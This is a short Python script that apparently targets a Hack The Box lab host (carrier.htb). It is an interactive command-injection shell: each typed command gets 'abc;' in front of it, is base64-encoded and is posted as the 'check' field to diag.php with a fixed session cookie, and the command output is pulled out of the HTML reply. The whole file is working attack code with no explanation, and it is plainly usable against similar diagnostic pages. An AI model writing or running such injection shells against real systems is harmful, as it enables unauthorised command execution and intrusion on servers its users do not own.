#!/usr/bin/python3

import requests
import re
import base64
from pwn import *

def cleanhtml(raw_html):
  cleanr = re.compile('<.*?>')
  cleantext = re.sub(cleanr, '', raw_html)
  return cleantext

proxies={"http":"http://127.0.0.1:8080"}
url="http://carrier.htb/diag.php"

while(True):
	payload=input("ENter ur payload: ")
	payload="abc;" + payload
	payload_bytes=payload.encode('ascii')
	b64_payload=base64.b64encode(payload_bytes)
	real_payload=b64_payload.decode('ascii')
	print(f"Payload:{real_payload}")

	#POST DATA
	data={"check":f"{real_payload}"}
	cookies={"PHPSESSID":"lio1spnm9ld1gr03prq0sq5om7"}

	#REQUEST
	r=requests.post(url,data=data,cookies=cookies,proxies=proxies)
	response=r.text
	# print(response)

	result=re.findall(r"abc</p><p>(.*)</p>",response)[0]
	bhosa=cleanhtml(result)
	print(bhosa)